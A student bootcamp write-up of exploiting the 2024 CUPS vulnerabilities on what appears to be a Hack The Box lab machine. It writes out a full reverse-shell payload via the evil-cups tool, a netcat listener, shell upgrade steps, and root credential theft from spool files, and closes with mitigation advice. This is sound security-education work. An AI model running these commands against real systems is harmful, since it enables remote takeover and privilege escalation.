# Exploiting CUPS Vulnerabilities ft. “Pentest” Python Module


## Presented by: Jason King and Liam Sainsbury ### [View the Presentation](https://github.com/HTR2A/SYD-UNI-CyberSec-Bootcamp/blob/main/24%20-%20%20Project%204%20bootCon/JASON%20KING%20-%20%20bootCon%20Presentation.pdf)


### Exploit & Script by: Jason King

---

## Technical Background

**CUPS (Common Unix Printing System)**  
CUPS is a modular printing system for Unix-like OSes that enables computers to act as print servers, handling print jobs and accepting printer commands.

**Key Features**:
- Internet Printing Protocol (IPP)
- Driver Support
- Web Interface
- Cross-Platform Compatibility

**Notable Quote**:
> “I’ve been scanning the entire public internet IPv4 ranges several times a day for weeks, sending the UDP packet and logging whatever connected back. I’ve got back connections from hundreds of thousands of devices, with peaks of 200-300K concurrent clients.” - Simone Margaritelli

---

## Identified Vulnerabilities

1. **CVE-2024-47076**:
   - Affects `libcupsfilters <= 2.1b1`
   - Vulnerable function: `cfGetPrinterAttributes5`
   - Description: Lack of validation of IPP attributes allows attackers to inject harmful data.

2. **CVE-2024-47175**:
   - Affects `libppd <= 2.1b1`
   - Vulnerable function: `ppdCreatePPDFromIPP2`
   - Description: Failure to sanitise attributes allows injection of malicious content into PPD files.

3. **CVE-2024-47176**:
   - Affects `cups-browsed <= 2.0.1`
   - Description: Binds to `INADDR_ANY:631`, allowing any source to trigger a malicious IPP request.

4. **CVE-2024-47177**:
   - Affects `Foomatic-RIP <= 2.0.1`
   - Description: Command execution via crafted PPD files.

**References**:
- [CVE-2024-47076](https://nvd.nist.gov/vuln/detail/CVE-2024-47076)
- [CVE-2024-47175](https://nvd.nist.gov/vuln/detail/CVE-2024-47175)
- [CVE-2024-47176](https://nvd.nist.gov/vuln/detail/CVE-2024-47176)
- [CVE-2024-47177](https://nvd.nist.gov/vuln/detail/CVE-2024-47177)

---

## Python Pentest Module - Overview

<a href="https://github.com/HTR2A/PenTest-Python/blob/main/penetration.py">PenTest Python Script</a>

**Key Features**:
1. Network Scanning
2. Service Enumeration
3. Brute-Force Attacks
4. Directory Fuzzing
5. Hash Cracking

**Usage**:
- Automates command execution using a modularised Python script.
- Provides a menu-driven interface to interactively run Nmap, Hydra, Gobuster, and Hashcat commands.
- Handles user input for options like wordlists, IP addresses, and output handling.

<img width="826" alt="Screenshot 2024-10-25 at 16 56 58" src="https://github.com/user-attachments/assets/1c4dd76a-cedb-4b0a-b4ef-181c6e69d732">


---

## Technical Breakdown

### Nmap Scans using my ***Python Module*** 
- **TCP Scan**: Detected open ports for SSH (22) and IPP (631).
- **UDP Scan**: Identified `cups-browsed` on UDP/631.

<img width="773" alt="Screenshot 2024-10-24 at 11 23 31" src="https://github.com/user-attachments/assets/589a7ce9-18fc-42c7-8a6b-2a0ee3737331">


### Exploitation Process

1. **Setup Malicious IPP Server**:
   - Created a virtual environment to isolate dependencies.
   - Used the `IPPServer` Python library to interact with CUPS.

Downloading the Malicious Script
<img width="593" alt="Screenshot 2024-10-24 at 11 31 35" src="https://github.com/user-attachments/assets/e3ff3679-51aa-4f91-b93d-02410695bd8d">

<img width="520" alt="Screenshot 2024-10-24 at 11 31 22" src="https://github.com/user-attachments/assets/864c08a5-44d6-47c6-8f07-5887224acd5f">

Installing requirments
<img width="977" alt="Screenshot 2024-10-24 at 11 38 27" src="https://github.com/user-attachments/assets/5f3eb719-2287-4870-863f-27f5c6fd8d7f">

Creating the virtual environment away from system python processes
![Virtual Environment Creation](https://github.com/user-attachments/assets/7110a70a-328f-4835-a157-118c069726aa)

2. **Create a Malicious Printer**:
   - Crafted a PPD file with a reverse shell payload.
   - Launched a Netcat listener to catch the incoming connection.


3. **Trigger the Exploit**:
   - Sent a UDP packet to install the malicious printer using the command:
     ```bash
     python3 evilcups.py 10.10.14.12 10.10.11.40 "nohup bash -c 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1' &"
     ```
   - The `nohup` command kept the reverse shell running after the print job completed.

![Printer Creation with command](https://github.com/user-attachments/assets/7c1e24ab-a870-4455-9bac-6052adf2c1fb)

<img width="1417" alt="Screenshot 2024-10-24 at 12 04 34" src="https://github.com/user-attachments/assets/fcb8cfb7-92c9-4599-8f67-37ac63bdb1f7">

4. **Establish a Shell**:
   - Sent a test print job via the CUPS web interface to execute the reverse shell.
   - Once connected, upgraded the shell for better usability:
     ```bash
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     ctrl + z
     stty raw -echo; fg
     export TERM=xterm
     ```

<img width="715" alt="Screenshot 2024-10-24 at 13 51 05" src="https://github.com/user-attachments/assets/c4745e37-5cf0-499b-ae2a-f1d1f01318a8">


5. **Privilege Escalation**:
   - Explored `/var/spool/cups/` to locate spool files.
   - Extracted the root password from a print job (`d00001-001`).
   - Switched to the root user using `su -` with the extracted password.
  
<img width="730" alt="Screenshot 2024-10-24 at 13 52 50" src="https://github.com/user-attachments/assets/15d8fd60-67a3-40f2-a70b-26b698149255">

<img width="901" alt="Screenshot 2024-10-24 at 13 53 07" src="https://github.com/user-attachments/assets/8cd39852-a239-419f-af19-88237e4e078b">

<img width="658" alt="Screenshot 2024-10-24 at 14 05 32" src="https://github.com/user-attachments/assets/3946be6d-508a-4521-be11-5bcc572ced37">


6. **Post-Exploitation**:
   - Obtained user and root flags.
   - Maintained persistence by leaving the malicious printer installed.

<img width="711" alt="Screenshot 2024-10-24 at 14 39 40" src="https://github.com/user-attachments/assets/71217c0c-a389-4ef2-94ae-9475bb76d567">

<img width="692" alt="Screenshot 2024-10-24 at 14 08 53" src="https://github.com/user-attachments/assets/c15379f7-17a3-48bf-b7b7-3ffa6d408d96">

<img width="716" alt="Screenshot 2024-10-24 at 14 46 14" src="https://github.com/user-attachments/assets/37342100-3f19-4c3b-abe2-ebc405a33f73">


---

## Demonstration Summary

- Executed an Nmap scan using the Python module.
- Accessed the CUPS web interface (`http://10.10.11.40:631`).
- Analysed vulnerabilities and exploited `CVE-2024-47176`.
- Set up a malicious IPP server with a crafted reverse shell payload.
- Gained shell access and escalated privileges to root.

---

## Mitigation Recommendations

1. **Patch Vulnerabilities**:
   - Apply patches for `libcupsfilters`, `libppd`, `cups-browsed`, and `foomatic-rip`.

2. **Disable Unused Services**:
   - Disable `cups-browsed` and `FoomaticRIP` if not needed to reduce exposure.

3. **Network Restrictions**:
   - Block external access to TCP/UDP port 631 and restrict it to trusted networks.

4. **Harden Configurations**:
   - Restrict service permissions in `cupsd.conf` and enforce authentication for printer management.

5. **Monitor and Log Activity**:
   - Enable logging within CUPS to track suspicious activity.
   - Monitor network traffic on port 631 for any unusual patterns.

---

## Commands Overview

Here is a summary of the key ```Bash``` commands used during exploitation:


1. **`nmap 10.10.11.40`**: This initial scan checks for open ports on the target IP (10.10.11.40) using the default scanning technique. It identifies which services might be running on the machine.
2. **`nmap -p$ports -sC -sV 10.10.11.40`**: Here, a more detailed scan is performed on the identified ports. The `sC` option runs default scripts, and `sV` detects service versions. This reveals more about the services running on specific ports.
3. **Navigate to `http://10.10.11.40:631`**: You manually visit port 631, which is commonly used for IPP (Internet Printing Protocol). This could reveal an exploitable CUPS (Common Unix Printing System) interface.
4. **`sudo nmap -sU -p 631,632 10.10.11.40`**: A UDP scan on ports 631 and 632 is used to check if these ports are open. UDP port 631 is critical because IPP runs over it, and seeing if it's open confirms that the IPP service is active.
5. **`git clone <https://github.com/IppSec/evil-cups.git`**:> You clone a known exploit tool for CUPS, which may include scripts for interacting with CUPS vulnerabilities.
6. **`cd evil-cups`**: You navigate into the cloned directory where the exploit code is located.
7. **`sudo apt install python3-venv`**: You install Python’s virtual environment package to isolate dependencies required by the exploit tool.
8. **`python3 -m venv .venv`**: Creates a new virtual environment (`.venv`) in the current directory for dependency management.
9. **`source .venv/bin/activate`**: Activates the virtual environment, isolating your work environment from global Python packages.
10. **`pip3 install -r requirements.txt`**: Installs the necessary dependencies listed in the `requirements.txt` file for the `evil-cups` tool.
11. **`python3 evilcups.py 10.10.14.12 10.10.11.40 "nohup bash -c 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1' &"`**: This command executes the exploit, sending a reverse shell payload to the target. The payload instructs the target to connect back to your machine (10.10.14.12) on port 9001. `nohup` ensures the process stays running even if the session terminates, and `&` sends it to the background.
12. **`nc -lvnp 9001`**: In a new terminal, you start a Netcat listener on port 9001 to catch the reverse shell from the target machine.
13. **Navigate to `http://10.10.11.40:631/printers`**: You browse to the CUPS printers page to find the printer you exploited.
14. **Select `HACKED_10.10.14_8-3` and "Print Test Page"**: This sends a print job to the hacked printer, triggering the malicious code you injected, which opens the reverse shell.
15. **Shell acquired**: Once the print job is sent, you now have shell access to the target machine.
16. **`python3 -c 'import pty; pty.spawn("/bin/bash")'`**: You upgrade your shell to a full interactive shell using Python’s `pty` module.
17. **`ctrl + z`** and **`stty raw -echo;fg`**: This sequence resets your terminal settings to work properly with the upgraded shell and foregrounds the shell process.
18. **`export TERM=xterm`**: Sets the terminal type to `xterm`, which makes the shell behave properly in your terminal.
19. **`cd ~` and `cd /home`**: You navigate to the home directory of the target to look for user-related files.
20. **`ls` and `cd htb`**: Lists files in the home directory and changes to the directory where user data is stored (in this case, `htb`).
21. **`cat user.txt`**: This displays the user flag stored in the `user.txt` file.
22. **`cd /var/spool/cups/`**: You navigate to the CUPS spool directory to look for potentially useful files or logs.
23. **`cat d00001-001`**: Reads a file in the CUPS spool directory, possibly revealing sensitive information such as root credentials.
24. **`su -`** (and paste password **`Br3@k-G!@ss-r00t-evilcups`**: You use the obtained password to switch to the root user.

---

